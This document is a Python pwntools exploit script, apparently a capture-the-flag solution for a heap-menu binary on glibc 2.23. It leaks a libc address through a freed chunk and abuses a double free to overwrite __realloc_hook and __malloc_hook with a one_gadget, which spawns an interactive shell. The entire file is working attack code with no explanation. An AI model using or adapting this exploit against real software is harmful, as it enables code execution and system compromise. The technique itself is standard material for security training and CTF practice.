#!/usr/bin/python3

from pwn import *

exe = ELF('./pwn2_df_patched', checksec=False)
libc = ELF('./libc.2.23.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main +35
        b* __GI___libc_realloc + 8
        c
        c
        ''')
        sleep(1)

def create_heap(idx,size,data):
    sla(">",b'1')
    slna("Index:",idx)
    slna("Input size:",size)
    sla("Input data:",data)

def show_heap(idx):
    sla(">",b'2')
    slna("Index:",idx)

def edit_heap(idx,data):
    sla(">",b'3')
    slna("Input index:",idx)
    sl(data)
def remove_heap(idx):
    sla(">",b'4')
    slna("Input index:",idx)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])


create_heap(0,0x60,b'hello')
create_heap(1,0x60,b'hello')
create_heap(2,0x510,b'hello')
create_heap(3,0x60,b'hello')
GDB()
remove_heap(0)
remove_heap(1)
remove_heap(2)

show_heap(2)

p.recvuntil(b"Data = ")
leak_libc = u64(p.recv(6) + b'\0\0')
libc.address = leak_libc - 0x39bb78
info(hex(leak_libc))
info(hex(libc.address))

payload = libc.sym['__realloc_hook'] -0x1b
info(hex(libc.sym['__realloc_hook']))
info(hex(payload))
info("one_gadget: "+hex((libc.address + 0xd5bf7)))



edit_heap(1,p64(payload))

create_heap(4,0x60,b'hello')
create_heap(5,0x60,b'hello')

payload = b'a'*0xb
payload += p64(libc.address + 0xd5bf7)
payload += p64(libc.sym['realloc']+8) 


edit_heap(5,payload)


sla(">",b'1')
slna("Index:",b'6')
slna("Input size:",b'30')




p.interactive()

